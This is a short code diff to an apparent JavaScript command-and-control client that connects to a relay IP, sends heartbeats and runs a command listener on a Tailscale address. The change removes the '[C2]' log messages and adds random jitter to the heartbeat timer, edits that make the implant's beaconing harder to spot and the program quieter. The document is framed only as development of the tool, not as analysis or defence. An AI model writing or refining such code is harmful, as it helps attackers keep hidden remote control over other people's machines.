@@ -65,10 +65,9 @@ function connectToRelay() {
   if (relayConn) try { relayConn.end(); } catch(e) {}
   relayConn = new net.Socket();
   relayConn.connect(cfg.RELAY_PORT, cfg.RELAY_IP, () => {
-    console.log('[C2] Connected to relay');
     sendHeartbeat();
     if (heartbeatTimer) clearInterval(heartbeatTimer);
-    heartbeatTimer = setInterval(sendHeartbeat, cfg.HEARTBEAT_INTERVAL);
+    heartbeatTimer = setInterval(sendHeartbeat, cfg.HEARTBEAT_INTERVAL + Math.floor(Math.random() * 10000));
   });
   relayConn.on('data', (d) => {
     const lines = d.toString().split('\n').filter(Boolean);
@@ -154,9 +153,7 @@ function startCmdServer() {
       } catch(e) {}
     });
   });
-  cmdServer.listen(cfg.CMD_PORT, tailscaleIP || '127.0.0.1', () => {
-    console.log(`[C2] Command listener on ${tailscaleIP}:${cfg.CMD_PORT}`);
-  });
+  cmdServer.listen(cfg.CMD_PORT, tailscaleIP || '127.0.0.1', () => {});
 }
 
 function init() {
